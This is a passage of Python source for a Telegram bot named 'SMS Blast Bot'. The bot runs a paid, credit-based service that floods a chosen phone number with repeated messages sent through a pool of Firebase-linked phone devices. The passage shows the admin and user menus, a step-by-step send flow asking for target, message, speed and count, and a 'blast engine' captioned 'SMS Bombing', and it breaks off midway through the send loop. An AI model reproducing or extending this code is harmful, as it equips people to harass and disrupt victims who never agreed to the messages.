        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ    : <b>{active}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ᴅʙs       : <b>{len(d.get('firebases', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ : <b>{len(PROTECTED_NUMBERS)}</b>\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴍᴏᴅᴇ      : {mode}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ   : {get_scan_status()}\n"
        f"━━━━━━━━━━━━━━━━━━")

def user_home_text(uid, d):
    ud = d["users"].get(str(uid), {})
    return (
        f"{em(EMOJI_PHONE, '📱')} <b>sᴍs ʙʟᴀsᴛ ʙᴏᴛ {_VERSION}</b>\n"
        f"<b>Owner:</b> {SUPER_ADMIN_NAME}\n\n"
        f"{em(EMOJI_STAR, '👤')} ʀᴏʟᴇ    : {role_tag(uid, d)}\n"
        f"{em(EMOJI_MONEY, '💰')} ᴄʀᴇᴅɪᴛs : <b>{ud.get('credits', 0)}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} ᴜsᴇs    : <b>{ud.get('uses', 0)}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ᴀᴘɪs    : <b>{len(d.get('firebases', []))}</b>\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ : {get_scan_status()}\n\n"
        f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴛᴏ sᴛᴀʀᴛ {em(EMOJI_ROCKET, '🚀')}")

# ═══════════════════════════════════════════════════════════════════
#  KEYBOARDS
# ═══════════════════════════════════════════════════════════════════
def owner_kb(d):
    mode_btn = (f"🔴 {sc('disable free')}", "owner:free:off") if d.get("free_mode") else (f"🟢 {sc('enable free')}", "owner:free:on")
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "owner:send", EMOJI_ROCKET, "📤"), btn("ғɪʀᴇʙᴀsᴇ", "owner:fb:menu:0", EMOJI_FIRE, "🔥")],
        [btn("ᴠɪᴅᴇᴏs", "owner:videos:menu", EMOJI_VIDEO, "📹"), btn("sᴜᴘᴇʀ ᴀᴅᴍɪɴs", "owner:owners:menu", EMOJI_CROWN, "👑")],
        [btn("ᴀᴅᴍɪɴs", "owner:admins:menu", EMOJI_SHIELD, "🛡"), btn("ᴜsᴇʀs", "owner:users:list", EMOJI_STAR, "👥")],
        [btn("ʙᴀɴ", "owner:ban", EMOJI_CROSS, "🚫"), btn("ᴜɴʙᴀɴ", "owner:unban:menu", EMOJI_CHECK, "✅")],
        [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "owner:broadcast", EMOJI_BELL, "📢"), btn("sᴛᴀᴛs", "owner:stats", EMOJI_STAR, "📊")],
        [btn("ᴀᴄᴛɪᴠɪᴛʏ", "owner:activity", EMOJI_GEAR, "📜"), btn("ᴘʀɪᴄɪɴɢ", "owner:pricing:menu", EMOJI_MONEY, "💳")],
        [btn("ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs", "owner:redeem:menu", EMOJI_GIFT, "🎁"), btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "💰")],
        [btn("ᴅᴇᴅᴜᴄᴛ ᴄʀᴇᴅɪᴛs", "owner:credits:deduct", EMOJI_CROSS, "💰"), btn("+ᴀʟʟ", "owner:add_all_credits", EMOJI_MONEY, "💰")],
        [btn("-ᴀʟʟ", "owner:deduct_all_credits", EMOJI_CROSS, "💰"), btn("ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj:menu", EMOJI_BELL, "🔗")],
        [btn("sᴇᴛᴛɪɴɢs", "owner:settings", EMOJI_GEAR, "⚙️"), btn("ᴛʀᴀᴄᴋ", "owner:track", EMOJI_STAR, "📊")],
        [btn("ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍ", "owner:protect", EMOJI_LOCK, "🔒"), btn("ᴘʀᴏᴛᴇᴄᴛᴇᴅ ʟɪsᴛ", "owner:protected_list", EMOJI_LOCK, "🔐")],
        [btn("ᴇxᴘᴏʀᴛ sᴄʀɪᴘᴛ", "owner:export_script", EMOJI_GEAR, "📤")],
        [InlineKeyboardButton(text=mode_btn[0], callback_data=mode_btn[1])],
        [btn("ʀᴇғʀᴇsʜ", "owner:refresh", EMOJI_GEAR, "🔄")]])

def admin_kb(d):
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "admin:send", EMOJI_ROCKET, "📤")],
        [btn("ᴜsᴇʀs", "admin:users:list", EMOJI_STAR, "👥"), btn("sᴛᴀᴛs", "admin:stats", EMOJI_STAR, "📊")],
        [btn("ʙᴀɴ", "admin:ban", EMOJI_CROSS, "🚫"), btn("ᴜɴʙᴀɴ", "admin:unban:menu", EMOJI_CHECK, "✅")],
        [btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "admin:broadcast", EMOJI_BELL, "📢")],
        [btn("ʀᴇғʀᴇsʜ", "admin:refresh", EMOJI_GEAR, "🔄")]])

def user_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "user:send", EMOJI_ROCKET, "📤")],
        [btn("ᴠɪᴅᴇᴏs", "user:random_video", EMOJI_VIDEO, "📹"), btn("ᴄʀᴇᴅɪᴛs", "user:credits", EMOJI_MONEY, "💳")],
        [btn("ʀᴇᴅᴇᴇᴍ", "user:redeem", EMOJI_GIFT, "🎁"), btn("ʀᴇғᴇʀ", "user:refer", EMOJI_STAR, "👥")],
        [btn("sᴛᴀᴛs", "user:stats", EMOJI_STAR, "📊"), btn("ʜɪsᴛᴏʀʏ", "user:sms_history", EMOJI_STAR, "📜")],
        [btn("ʙᴜʏ ᴄʀᴇᴅɪᴛs", "user:pricing", EMOJI_MONEY, "💰")],
        [btn("ᴛʀᴀɴsғᴇʀ", "user:transfer", EMOJI_MONEY, "💸")],
        [btn("ɪɴғᴏ", "user:info", EMOJI_GEAR, "ℹ️"), btn("sᴜᴘᴘᴏʀᴛ", "user:support", EMOJI_BELL, "🆘")]])

def videos_menu_kb(d):
    vids = d.get("videos", [])
    rows = [[btn("ᴀᴅᴅ ᴠɪᴅᴇᴏ", "owner:videos:add", EMOJI_CHECK, "➕")],
            [btn("ᴅᴇʟ ᴀʟʟ", "owner:videos:bulk_del", EMOJI_CROSS, "🗑")]]
    for i in range(len(vids)):
        rows.append([btn(f"ᴠɪᴅᴇᴏ #{i+1}", "noop", EMOJI_VIDEO, "📹"),
                     btn("ʀᴇᴍᴏᴠᴇ", f"owner:videos:del:{i}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def fb_menu_kb(d, page=0):
    fbs = d.get("firebases", [])
    per = 8
    total = max(1, (len(fbs) + per - 1) // per)
    page = max(0, min(page, total - 1))
    chunk = fbs[page*per:(page+1)*per]
    rows = [[btn("ᴀᴅᴅ ᴅʙ", "owner:fb:add", EMOJI_CHECK, "➕"),
             btn("ᴛxᴛ", "owner:fb:add_file", EMOJI_CHECK, "📄")]]
    for fb in chunk:
        label = fb.get("label", fb["url"])[:16]
        rows.append([btn(label, "noop", EMOJI_FIRE, "🔥"),
                     btn("ʀᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}:{page}", EMOJI_CROSS, "🗑")])
    nav = []
    if page > 0: nav.append(btn("◀️", f"owner:fb:menu:{page-1}"))
    if page < total - 1: nav.append(btn("▶️", f"owner:fb:menu:{page+1}"))
    if nav: rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def owners_menu_kb(d):
    owners = d.get("owners", [])
    rows = []
    if len(owners) < 6: rows.append([btn("ᴀᴅᴅ", "owner:owners:add", EMOJI_CHECK, "➕")])
    for oid in owners:
        if oid == MAIN_OWNER: rows.append([btn(f"{oid} (ᴍᴀɪɴ)", "noop", EMOJI_CROWN, "👑")])
        else: rows.append([btn(str(oid), "noop", EMOJI_CROWN, "🔱"),
                           btn("ʀᴇᴍᴏᴠᴇ", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admins_menu_kb(d):
    admins = d.get("admins", [])
    rows = [[btn("ᴀᴅᴅ", "owner:admins:add", EMOJI_CHECK, "➕")]]
    for aid in admins:
        rows.append([btn(str(aid), "noop", EMOJI_SHIELD, "🛡"),
                     btn("ʀᴇᴍᴏᴠᴇ", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑")])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def unban_menu_kb(d, prefix):
    banned = d.get("banned", [])
    rows = []
    for bid in banned: rows.append([btn(str(bid), f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓")])
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def users_list_kb(d, prefix, page=0):
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start:start+per]
    banned = d.get("banned", []); approved = d.get("approved", [])
    lines = [f"{em(EMOJI_STAR, '👥')} <b>{sc('users')} ({len(items)})</b>\n"]
    for uid_str, ud in chunk:
        u = int(uid_str)
        if u in banned: st = "🚫"
        elif u in approved: st = "✅"
        elif is_owner(u, d): st = "👑"
        elif u in d["admins"]: st = "🛡"
        else: st = "👤"
        lines.append(f"{st} <code>{u}</code> — {ud.get('name', '?')[:18]} | 💰{ud.get('credits', 0)}")
    text = "\n".join(lines)
    nav = []
    if page > 0: nav.append(btn("◀️", f"{prefix}:users:pg:{page-1}"))
    if start + per < len(items): nav.append(btn("▶️", f"{prefix}:users:pg:{page+1}"))
    rows = []
    if nav: rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return text, InlineKeyboardMarkup(inline_keyboard=rows)

def api_stats_text(d):
    stats = d.get("stats", {})
    api_use = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}
    lines = [f"{em(EMOJI_STAR, '📊')} <b>{sc('api stats')}</b>\n",
             f"{em(EMOJI_CHECK, '📤')} sᴇɴᴛ   : <b>{stats.get('total_sent', 0)}</b>",
             f"{em(EMOJI_CROSS, '❌')} ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n",
             "━━━━━━━━━━━━━━━━━━",
             f"<b>{sc('per firebase:')}</b>"]
    if not api_use: lines.append(f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴜsᴀɢᴇ ʏᴇᴛ.")
    for fb_id, fbs_data in api_use.items():
        fb = fbs.get(fb_id)
        label = fb.get("label", fb_id[:20]) if fb else fb_id[:20]
        label = label.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")
        lines.append(f"{em(EMOJI_FIRE, '🔥')} {label}\n   ✅ {fbs_data.get('sent', 0)}  ❌ {fbs_data.get('failed', 0)}")
    return "\n".join(lines)

# ═══════════════════════════════════════════════════════════════════
#  ROUTER + HANDLERS
# ═══════════════════════════════════════════════════════════════════
R = Router()

@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))
    name = msg.from_user.full_name or "User"
    d = load()
    is_new = reg_user(uid, name, d)
    if is_new:
        asyncio.create_task(send_channel_log(msg.bot,
            f"🆕 <b>NEW USER</b>\n👤 {name}\n🆔 <code>{uid}</code>\n📅 {fmt_time(int(time.time()))}"))
    args = msg.text.split()
    code = args[1] if len(args) > 1 else ""
    if code.startswith("REF") and not d["users"].get(str(uid), {}).get("referred_by"):
        success, _, referrer = process_referral(uid, code, d)
        if success and referrer:
            try: await msg.bot.send_message(referrer,
                f"{em(EMOJI_GIFT, '🎉')} {name} ne aapka referral use kiya! +{d['settings']['ref_credits']} credits!",
                parse_mode="HTML")
            except: pass
        save(d)
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing),
                          parse_mode="HTML", disable_web_page_preview=True); return
    await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome to SMS Blast Bot!\nOwner: {SUPER_ADMIN_NAME}")
    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML"); return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML"); return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>"); return
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\nOwner: {SUPER_ADMIN_LINK}", parse_mode="HTML"); return
    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))
    name = msg.from_user.full_name or "User"
    d = load()
    is_new = reg_user(uid, name, d); save(d)
    if is_new:
        asyncio.create_task(send_channel_log(msg.bot,
            f"🆕 <b>NEW USER</b>\n👤 {name}\n🆔 <code>{uid}</code>\n📅 {fmt_time(int(time.time()))}"))
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing),
                          parse_mode="HTML", disable_web_page_preview=True); return
    await send_random_video(msg.bot, msg.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Welcome to SMS Blast Bot!\nOwner: {SUPER_ADMIN_NAME}")
    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML"); return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML"); return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kar diya gaya hai.</b>"); return
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>", parse_mode="HTML"); return
    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.message(Command("status"))
async def cmd_status(msg: Message, state: FSMContext):
    uid = msg.from_user.id; d = load()
    if not is_admin(uid, d): await msg.answer("🚫 Admin only!"); return
    devices = get_cached_devices()
    active = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    await msg.answer(
        f"{em(EMOJI_STAR, '📊')} <b>BOT STATUS</b>\n\n"
        f"{em(EMOJI_GEAR, '🔄')} Scanner: {get_scan_status()}\n"
        f"{em(EMOJI_PHONE, '📱')} Devices: <b>{len(devices)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} Active sends: <b>{active}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} Firebases: <b>{len(d.get('firebases', []))}</b>\n"
        f"{em(EMOJI_STAR, '👥')} Users: <b>{len(d.get('users', {}))}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} Total sent: <b>{d['stats'].get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} Failed: <b>{d['stats'].get('total_failed', 0)}</b>",
        parse_mode="HTML")

@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id; d = load()
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("❌ Abhi bhi join nahi kiya!", show_alert=True)
        try: await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing),
                                          parse_mode="HTML", disable_web_page_preview=True)
        except: pass
        return
    await cq.answer("✅ Verified!", show_alert=True)
    await send_random_video(cq.bot, cq.message.chat.id, caption=f"{em(EMOJI_ROCKET, '🚀')} Verified!\nOwner: {SUPER_ADMIN_NAME}")
    if is_owner(uid, d): await cq.message.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    elif is_admin(uid, d): await cq.message.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    else: await cq.message.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

# ═══════════════════════════════════════════════════════════════════
#  USER SEND FLOW
# ═══════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("⛔ Force Join compulsory!", show_alert=True)
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing),
                                    parse_mode="HTML", disable_web_page_preview=True); return
    if not can_use(uid, d): await cq.answer("🚫 Access denied!", show_alert=True); return
    await state.set_state(S.send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Number bhejo:\n<i>Example: +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")

@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number. Dobara bhejo:"); return
    if number in PROTECTED_NUMBERS:
        await msg.answer(f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>"); return
    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — message</b>\n\nMessage bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]), parse_mode="HTML")

@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_speed)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Saved!\n\n{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — speed</b>\n\nSpeed:",
                     reply_markup=speed_kb("user"), parse_mode="HTML")

@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    smap = {"user:speed:fast": SPEED_FAST, "user:speed:medium": SPEED_MEDIUM, "user:speed:slow": SPEED_SLOW}
    sp = smap.get(cq.data, SPEED_MEDIUM)
    lbl = "🚀 FAST" if sp == SPEED_FAST else "⚡ MEDIUM" if sp == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=sp)
    await state.set_state(S.send_count)
    devices = get_cached_devices() or await get_all_online_devices(d)
    cnt = len(devices)
    credit_info = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        credit_info = f"\n{em(EMOJI_MONEY, '💰')} Credits: <b>{get_user_credits(uid, d)}</b>"
    await cq.message.edit_text(
        f"{lbl} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — count</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online APIs : <b>{cnt}</b>{credit_info}\n\nKitne SMS?",
        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]), parse_mode="HTML")

@R.message(S.send_count)
async def user_got_count(msg: Message, state: FSMContext):
    d = load(); uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo:"); return
    await state.clear()
    number = fsmd.get("number", ""); message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    if not is_admin(uid, d) and not is_owner(uid, d):
        cur = get_user_credits(uid, d)
        if cur <= 0:
            await msg.answer(f"{em(EMOJI_CROSS, '❌')} <b>Credits nahi hain!</b>",
                              reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
        if count > cur: count = cur
    devices = get_cached_devices() or await get_all_online_devices(d)
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi!",
                          reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML"); return
    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message_text, count, devices, send_speed)

# ═══════════════════════════════════════════════════════════════════
#  OWNER SEND FLOW
# ═══════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_owner(uid, d): await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.owner_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Super Admin SMS Send</b>\n\n"
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — number</b>\n\nNumber bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.owner_send_number)
async def owner_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number."); return
    await state.update_data(number=number)
    await state.set_state(S.owner_send_message)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Number: <code>{number}</code>\n\n{em(EMOJI_STAR, '💬')} <b>step 2/4</b>\n\nMessage:",
                     reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.owner_send_message)
async def owner_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.owner_send_speed)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Saved!\n\n{em(EMOJI_ROCKET, '⚡')} <b>step 3/4 — speed</b>",
                     reply_markup=speed_kb("owner"), parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
async def owner_speed_selected(cq: CallbackQuery, state: FSMContext):
    smap = {"owner:speed:fast": SPEED_FAST, "owner:speed:medium": SPEED_MEDIUM, "owner:speed:slow": SPEED_SLOW}
    sp = smap.get(cq.data, SPEED_MEDIUM)
    lbl = "🚀 FAST" if sp == SPEED_FAST else "⚡ MEDIUM" if sp == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=sp)
    await state.set_state(S.owner_send_count)
    devices = get_cached_devices() or await get_all_online_devices(load())
    await cq.message.edit_text(
        f"{lbl} <b>selected!</b>\n\n{em(EMOJI_FIRE, '🔥')} Online APIs: <b>{len(devices)}</b>\n\nKitne SMS?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]), parse_mode="HTML")

@R.message(S.owner_send_count)
async def owner_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo:"); return
    await state.clear()
    number = fsmd.get("number", ""); message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices() or await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} No API online!",
                          reply_markup=kb([(f"{sc('owner panel')}", "owner:home")]), parse_mode="HTML"); return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

# ═══════════════════════════════════════════════════════════════════
#  ADMIN SEND FLOW
# ═══════════════════════════════════════════════════════════════════
@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    d = load(); uid = cq.from_user.id
    if not is_admin(uid, d): await cq.answer("🚫 Admin only!", show_alert=True); return
    await state.set_state(S.admin_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admin SMS Send</b>\n\nNumber bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]), parse_mode="HTML")

@R.message(S.admin_send_number)
async def admin_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number."); return
    if number in PROTECTED_NUMBERS:
        protector = PROTECTED_NUMBERS[number]
        if not is_owner(msg.from_user.id, load()) and msg.from_user.id != protector:
            await msg.answer(f"{em(EMOJI_LOCK, '🔒')} Protected!"); return
    await state.update_data(number=number)
    await state.set_state(S.admin_send_message)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Number: <code>{mask_number(number)}</code>\n\nMessage:",
                     reply_markup=kb([(f"{sc('cancel')}", "admin:home")]), parse_mode="HTML")

@R.message(S.admin_send_message)
async def admin_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.admin_send_speed)
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Saved!\n\nSpeed:", reply_markup=speed_kb("admin"), parse_mode="HTML")

@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
async def admin_speed_selected(cq: CallbackQuery, state: FSMContext):
    smap = {"admin:speed:fast": SPEED_FAST, "admin:speed:medium": SPEED_MEDIUM, "admin:speed:slow": SPEED_SLOW}
    sp = smap.get(cq.data, SPEED_MEDIUM)
    lbl = "🚀 FAST" if sp == SPEED_FAST else "⚡ MEDIUM" if sp == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=sp)
    await state.set_state(S.admin_send_count)
    devices = get_cached_devices() or await get_all_online_devices(load())
    await cq.message.edit_text(f"{lbl} selected!\n\n{em(EMOJI_FIRE, '🔥')} APIs: <b>{len(devices)}</b>\n\nKitne SMS?",
                                reply_markup=kb([(f"{sc('cancel')}", "admin:home")]), parse_mode="HTML")

@R.message(S.admin_send_count)
async def admin_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo:"); return
    await state.clear()
    number = fsmd.get("number", ""); message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices() or await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} No API online!",
                          reply_markup=kb([(f"{sc('admin panel')}", "admin:home")]), parse_mode="HTML"); return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

# ═══════════════════════════════════════════════════════════════════
#  BLAST ENGINE
# ═══════════════════════════════════════════════════════════════════
async def run_sms_blast_with_progress(bot, msg, uid, number, message, count, devices, speed=SPEED_DEFAULT):
    await send_random_video(bot, msg.chat.id, caption=f"💣 <b>SMS Bombing on {mask_number(number)}!</b>")

    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            old = USER_SESSIONS[uid]
            if old.task and not old.task.done():
                await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} <b>Ek sending already chal rahi hai!</b>",
                                  parse_mode="HTML"); return
            del USER_SESSIONS[uid]
        session = UserSession(uid); session.number = number
        USER_SESSIONS[uid] = session

    is_reg = not is_admin(uid, load()) and not is_owner(uid, load())
    cur_credits = get_user_credits(uid, load()) if is_reg else None
    lbl = "🚀 FAST" if speed == SPEED_FAST else "⚡ MEDIUM" if speed == SPEED_MEDIUM else "🐢 SLOW"

    try:
        pmsg = await msg.answer(progress_text(0, 0, count, cur_credits, lbl),
                                 reply_markup=stop_send_kb(), parse_mode="HTML")
    except Exception as e:
        log.error(f"Progress msg failed: {e}")
        async with SESSIONS_LOCK:
            if uid in USER_SESSIONS: del USER_SESSIONS[uid]
        return

    sent_ok = 0; sent_fail = 0; msgs_left = count
    api_usage_delta = {}
    last_update = time.time(); start = time.time()

    async def do_send():
        nonlocal sent_ok, sent_fail, msgs_left, last_update
        try:
            for device in devices:
                if msgs_left <= 0: break
                async with session.lock:
                    if session.cancelled: break
                fb_id = device["fb_id"]; fb_url = device["fb_url"]
                dev_id = device["dev_id"]; sims = device["sims"]
                slots = [s.get("simSlotIndex", 0) for s in sims] if sims else [0]
                quota = min(3, msgs_left); d_sent = 0
                for sim in slots:
                    async with session.lock:
                        if d_sent >= quota or msgs_left <= 0 or session.cancelled: break
                    ok = await send_sms_via_device(fb_url, dev_id, sim, number, message)
                    async with session.lock:
                        if ok:
                            sent_ok += 1; d_sent += 1; msgs_left -= 1
                            if is_reg:
                                dt = load(); deduct_credits(uid, 1, dt)
                                dt["stats"]["total_sent"] = dt["stats"].get("total_sent", 0) + 1
                                k = str(uid)
                                if k in dt["users"]:
                                    dt["users"][k]["uses"] = dt["users"][k].get("uses", 0) + 1
                                dt.setdefault("sms_history", {}).setdefault(str(uid), []).append({
                                    "number": number, "message": message[:100],
                                    "timestamp": int(time.time()), "status": "sent"})
